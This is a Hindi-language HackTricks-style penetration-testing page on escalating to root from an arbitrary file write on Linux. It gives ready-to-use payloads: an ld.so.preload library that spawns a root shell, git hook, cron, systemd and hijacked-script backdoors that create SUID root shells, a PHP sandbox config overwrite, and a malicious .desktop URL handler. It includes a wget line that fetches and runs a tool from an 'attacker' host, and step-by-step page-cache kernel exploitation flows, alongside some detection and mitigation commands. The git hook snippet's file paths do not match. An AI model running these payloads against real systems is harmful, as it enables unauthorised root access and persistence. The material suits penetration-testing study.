# Root के लिए Arbitrary File Write

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

यह फ़ाइल **`LD_PRELOAD`** env variable की तरह काम करती है, लेकिन यह **SUID binaries** में भी काम करती है।\
यदि आप इसे create या modify कर सकते हैं, तो आप इसमें बस **उस library का path जोड़ सकते हैं जिसे load किया जाएगा** हर executed binary के साथ।

उदाहरण: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) **scripts** होते हैं, जो git repository में होने वाली विभिन्न **events** पर **run** किए जाते हैं, जैसे commit बनने पर, merge होने पर... इसलिए यदि कोई **privileged script or user** ये actions अक्सर perform कर रहा है और **`.git` folder** में **write** करना संभव है, तो इसका उपयोग **privesc** के लिए किया जा सकता है।

उदाहरण के लिए, किसी git repo में **`.git/hooks`** के अंदर **script generate** करना संभव है, ताकि नया commit बनाए जाने पर यह हमेशा execute हो:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron और Time files

यदि आप **ऐसी cron-संबंधित files में write कर सकते हैं जिन्हें root execute करता है**, तो आमतौर पर अगली बार job चलने पर code execution प्राप्त कर सकते हैं। रुचिकर targets में शामिल हैं:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` या `/var/spool/cron/crontabs/` में root का अपना crontab
- `systemd` timers और वे services जिन्हें वे trigger करते हैं

त्वरित जाँच:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
सामान्य abuse paths:

- **`/etc/crontab` या `/etc/cron.d/` की किसी फ़ाइल में नया root cron job जोड़ें**
- **`run-parts` द्वारा पहले से चलाए जाने वाले script को बदलें**
- **जिस script या binary को वह लॉन्च करता है, उसे संशोधित करके किसी मौजूदा timer target में backdoor डालें**

न्यूनतम cron payload का उदाहरण:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
यदि आप केवल `run-parts` द्वारा उपयोग की जाने वाली cron डायरेक्टरी के अंदर लिख सकते हैं, तो वहाँ एक executable फ़ाइल रखें:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
नोट्स:

- `run-parts` आमतौर पर dot वाले filenames को अनदेखा करता है, इसलिए `backup.sh` के बजाय `backup` जैसे names को प्राथमिकता दें।
- कुछ distros classic cron के बजाय `anacron` या `systemd` timers का उपयोग करते हैं, लेकिन abuse का विचार वही रहता है: **बाद में root द्वारा execute की जाने वाली चीज़ को modify करें**।

### Service & Socket files

यदि आप **`systemd` unit files** या उनके द्वारा referenced files में write कर सकते हैं, तो unit को reload और restart करके, या service/socket activation path के trigger होने की प्रतीक्षा करके, root के रूप में code execution प्राप्त कर सकते हैं।

Interesting targets में शामिल हैं:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` में Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` द्वारा referenced Service scripts/binaries
- root service द्वारा load किए गए writable `EnvironmentFile=` paths

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
सामान्य abuse paths:

- **Overwrite `ExecStart=`** ऐसे root-owned service unit में, जिसे आप modify कर सकते हैं
- **Add a drop-in override** जिसमें malicious `ExecStart=` हो और पहले पुराने को clear करें
- Unit द्वारा पहले से referenced script/binary में **Backdoor** डालें
- **Hijack a socket-activated service** इसके corresponding `.service` file को modify करके, जो socket को connection मिलने पर start होती है

उदाहरण malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
सामान्य activation flow:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
यदि आप services को स्वयं restart नहीं कर सकते, लेकिन socket-activated unit को edit कर सकते हैं, तो आपको root के रूप में backdoored service के execution को trigger करने के लिए केवल **किसी client connection का इंतज़ार** करना पड़ सकता है।

### Privileged PHP sandbox द्वारा उपयोग किए जाने वाले restrictive `php.ini` को overwrite करना

कुछ custom daemons user-supplied PHP को **restricted `php.ini`** के साथ `php` चलाकर validate करते हैं (उदाहरण के लिए, `disable_functions=exec,system,...`)। यदि sandboxed code में अभी भी **कोई write primitive** (जैसे `file_put_contents`) मौजूद है और आप daemon द्वारा उपयोग किए जाने वाले **exact `php.ini` path** तक पहुंच सकते हैं, तो आप restrictions हटाने के लिए उस config को **overwrite** कर सकते हैं और फिर elevated privileges के साथ चलने वाला दूसरा payload submit कर सकते हैं।

Typical flow:

1. पहला payload sandbox config को overwrite करता है।
2. दूसरा payload अब dangerous functions के re-enabled होने के बाद code execute करता है।

Minimal example (daemon द्वारा उपयोग किए जाने वाले path को replace करें):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
यदि daemon root के रूप में चलता है (या root-owned paths से validation करता है), तो दूसरा execution root context प्राप्त करता है। यह मूल रूप से **config overwrite के माध्यम से privilege escalation** है, जब sandboxed runtime अभी भी files में write कर सकता है।

### binfmt_misc

`/proc/sys/fs/binfmt_misc` में स्थित file यह बताती है कि किस प्रकार की files को execute करने के लिए कौन-सा binary उपयोग किया जाना चाहिए। TODO: यह जांचना है कि किसी सामान्य file type को open किए जाने पर rev shell execute कराने के लिए इसका दुरुपयोग करने की आवश्यकताएं क्या हैं।

### Overwrite schema handlers (जैसे http: या https:)

Victim की configuration directories में write permissions वाला attacker system behavior को बदलने वाली files को आसानी से replace या create कर सकता है, जिसके परिणामस्वरूप अनपेक्षित code execution हो सकता है। `$HOME/.config/mimeapps.list` file को modify करके HTTP और HTTPS URL handlers को किसी malicious file पर point करने (जैसे, `x-scheme-handler/http=evil.desktop` सेट करने) पर attacker यह सुनिश्चित करता है कि **किसी भी http या https link पर click करने से उस `evil.desktop` file में specified code execute हो**। उदाहरण के लिए, `$HOME/.local/share/applications` में `evil.desktop` में निम्न malicious code रखने के बाद, किसी भी external URL पर click करने से embedded command run होती है:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
अधिक जानकारी के लिए [**इस post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) को देखें, जहाँ इसका उपयोग एक वास्तविक vulnerability को exploit करने के लिए किया गया था।

### Root द्वारा user-writable scripts/binaries को execute करना

यदि कोई privileged workflow `/bin/sh /home/username/.../script` जैसा कुछ चलाता है (या unprivileged user के स्वामित्व वाली directory के अंदर मौजूद कोई binary चलाता है), तो आप इसे hijack कर सकते हैं:

- **Execution का पता लगाएँ:** root द्वारा user-controlled paths को invoke करने की जानकारी प्राप्त करने के लिए [pspy](https://github.com/DominicBreuker/pspy) के साथ processes को monitor करें:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Writeability की पुष्टि करें:** सुनिश्चित करें कि target file और उसकी directory दोनों आपके user के स्वामित्व में हों और writable हों।
- **Target को hijack करें:** original binary/script का backup लें और ऐसा payload डालें जो SUID shell (या कोई अन्य root action) बनाए, फिर permissions restore करें:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **privileged action को trigger करें** (जैसे, ऐसा UI button दबाना जो helper को spawn करता है)। जब root hijacked path को दोबारा execute करे, तो `./rootshell -p` से escalated shell प्राप्त करें।

### Privileged binaries में page-cache-only file modification

कुछ kernel bugs file को **disk पर** modify नहीं करते। इसके बजाय, वे आपको किसी readable file की केवल **page cache copy** modify करने देते हैं। यदि आप किसी **setuid** या अन्यथा **root-executed** binary को target कर सकते हैं, तो अगली execution memory से attacker-controlled bytes चला सकती है और privileges escalate कर सकती है, भले ही disk पर file hash unchanged हो।

इसे **runtime-only file write primitive** के रूप में समझना उपयोगी है:

- **Disk clean रहता है**: inode और on-disk bytes नहीं बदलते
- **Memory dirty होती है**: cached page को पढ़ने या execute करने वाली processes को attacker-modified content मिलता है
- **Effect temporary होता है**: reboot या cache eviction के बाद बदलाव गायब हो जाता है

यह primitive classic **arbitrary file write** और Dirty COW / Dirty Pipe जैसे पुराने **page-cache abuse** bugs के बीच आता है:

- Dirty COW एक race पर निर्भर था
- Dirty Pipe में write-position constraints थीं
- यदि vulnerable path cached file-backed pages में direct writes देता है, तो page-cache-only primitive अधिक reliable हो सकता है

#### Generic privesc flow

1. ऐसा kernel primitive प्राप्त करें जो **file-backed page cache pages** में write कर सके
2. इसका उपयोग किसी **readable privileged binary** या अन्य root-executed file पर करें
3. Page के cache से evict होने से **पहले** execution trigger करें
4. On-disk file unmodified दिखते हुए root के रूप में code execution प्राप्त करें

Typical high-value targets:

- **setuid-root** binaries
- **root services** द्वारा launch किए गए helpers
- ऐसे binaries जिन्हें आम तौर पर **host kernel/page cache share करने वाले containers** से execute किया जाता है

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) इस class का अच्छा उदाहरण है। Vulnerable path Linux crypto userspace API (`AF_ALG` / `algif_aead`) में था:

- `splice()` किसी readable file से page-cache pages के references को crypto TX scatterlist में move कर सकता है
- in-place `algif_aead` decrypt path ने source और destination buffers को reuse किया
- `authencesn` ने destination tag region में write किया
- जब वह region अभी भी spliced file-backed pages को reference कर रहा था, तो write **target file के page cache** में चली गई

इसलिए interesting technique स्वयं CVE नहीं, बल्कि यह pattern है:

- **file-backed cache pages को किसी kernel subsystem में feed करें**
- subsystem को उन्हें **writable output** के रूप में treat करने दें
- memory में एक छोटा controlled overwrite trigger करें

Public PoC ने `/usr/bin/su` को memory में patch करने के लिए repeated **4-byte writes** का उपयोग किया और फिर उसे execute किया।

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) इसी **page-cache-only write-to-root** pattern का एक और variant दिखाता है, लेकिन इस बार sink `AF_ALG` के बजाय **IPsec ESP decrypt** है।

महत्वपूर्ण technique **metadata-laundering step** है:

- `splice()` एक **read-only file-backed page-cache page** को ESP-in-UDP packet में रखता है
- original DirtyFrag mitigation ने उस skb को `SKBFL_SHARED_FRAG` से tag किया, ताकि `esp_input()` decrypt करने से **पहले copy** करे
- netfilter `TEE` packet को `nf_dup_ipv4()` -> `__pskb_copy_fclone()` के माध्यम से duplicate करता है
- clone वही **physical page-cache reference** बनाए रखता है, लेकिन `SKBFL_SHARED_FRAG` खो देता है
- इसके बाद `esp_input()` clone को safe मानता है और file-backed page पर **in-place `cbc(aes)` decrypt** चलाता है

इसलिए reviewer lesson CVE से व्यापक है: यदि कोई mitigation यह तय करने के लिए **skb/page metadata** पर निर्भर करती है कि operation को पहले copy करना है या नहीं, तो backing page को बनाए रखते हुए metadata हटाने वाला कोई भी **clone/copy path** अनजाने में write primitive को फिर से खोल सकता है।

Typical exploitation flow:

1. Private network namespace के अंदर **`CAP_NET_ADMIN`** प्राप्त करने के लिए `unshare(CLONE_NEWUSER | CLONE_NEWNET)` करें
2. Loopback को up करें और `mangle/OUTPUT` में एक **netfilter `TEE` rule** install करें
3. `NETLINK_XFRM` के माध्यम से **XFRM ESP transport SAs** install करें
4. प्रत्येक target 4-byte word को SA के `seq_hi` field में encode करें (DirtyFrag की word-selection trick)
5. Spliced ESP-in-UDP packet भेजें, ताकि **TEE clone** `esp_input()` तक पहुँचे और **in place** decrypt करे
6. तब तक repeat करें, जब तक `/usr/bin/su` या किसी अन्य privileged executable की page-cache copy में attacker-controlled code न आ जाए

Operationally, impact `AF_ALG` example जैसा ही है: disk पर file clean रहती है, लेकिन `execve()` **mutated page-cache bytes** consume करता है और root access देता है।

इस variant के लिए उपयोगी exposure checks:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
यहाँ short-term attack-surface reduction भी path-specific है: `48f6a5356a33` वाला kernel upgrade करने से clone path ठीक हो जाता है, जबकि `xt_TEE` autoload को block करने से **flag-laundering step** हट जाता है और `esp4` / `esp6` को block करने से **decrypt sink** हट जाता है।

#### Exposure और hunting

अगर आपको इस class of bug का संदेह है, तो केवल disk integrity checks पर निर्भर न रहें। यह भी verify करें:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` को module के रूप में load/unload किया जा सकता है
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface kernel में built-in है
- setuid binaries अच्छे targets हैं क्योंकि page-cache-only patch local foothold को root में बदलने के लिए पर्याप्त हो सकता है

#### `algif_aead` path के लिए Attack-surface में कमी

यदि vulnerable interface loadable module द्वारा प्रदान किया गया है:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
यदि इसे kernel में compile किया गया है, तो कुछ disclosures ने init path को block करने की सूचना दी है:
```bash
initcall_blacklist=algif_aead_init
```
इस तरह की mitigation को अन्य kernel LPEs के लिए भी याद रखना उपयोगी है: यदि exploitation किसी विशिष्ट optional interface पर निर्भर करता है, तो उस interface को disable या blacklist करने से full kernel upgrade उपलब्ध होने से पहले ही exploit path बाधित हो सकता है।

## संदर्भ

- [HTB Bamboo – user-writable PaperCut directory में root-executed script को hijack करना](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [CVE-2026-31431 के लिए Openwall oss-security disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - out-of-place operation पर वापस लौटें](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: Linux LPE Variant DirtyClone (CVE-2026-43503) का विश्लेषण और exploitation](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Linux fix: net: skb: `__pskb_copy_fclone()` में `SKBFL_SHARED_FRAG` को preserve करें (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Linux earlier mitigation: spliced UDP packets के लिए `SKBFL_SHARED_FRAG` set करें (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
